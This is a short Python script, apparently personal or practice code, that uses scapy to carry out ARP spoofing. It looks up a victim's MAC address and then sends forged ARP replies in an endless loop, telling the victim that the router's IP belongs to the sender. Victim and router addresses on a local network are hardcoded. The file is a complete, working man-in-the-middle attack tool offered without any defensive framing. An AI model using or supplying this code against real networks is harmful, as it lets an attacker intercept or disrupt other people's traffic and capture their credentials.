from scapy.all import ARP, Ether, sendp, arping
import time

# we want to get mac address so we send arp request
def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False) # sending arp to given IP address
    for s, r in ans:
        return r[Ether].src     # getting MAC address from Ethernet answer
    return None


def arp_spoof(target_ip, spoof_ip, iface=None):
    target_mac = get_mac(target_ip)     # get MAC of victim
    if not target_mac:
        print(f"[!] Could not get MAC for {target_ip}")
        return

    print(f"[+] Target MAC for {target_ip} is {target_mac}")
    print(f"[*] Starting ARP spoof: Telling {target_ip} that {spoof_ip} is-at <your-mac>\n")

    # target address is now our victim's address
    packet = Ether(dst=target_mac) / ARP(
        op=2,
        psrc=spoof_ip,          # address IP which i pretend i am
        pdst=target_ip,
        hwdst=target_mac
    )

    try:
        while True:
            sendp(packet, iface=iface, verbose=0)       # sending packets in Ethernet layer not IP
            print(f"[+] Sent ARP reply to {target_ip}: {spoof_ip} is-at <your-mac>")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Spoofing stopped.")

if __name__ == "__main__":
    victim_ip = "192.168.115.31"          # in wireshark: arp
    spoof_ip = "192.168.115.43"           # The IP you’re pretending to be / ROUTER
    iface = "MediaTek Wi-Fi 6E MT7902 Wireless LAN Card"

    arp_spoof(victim_ip, spoof_ip, iface=iface)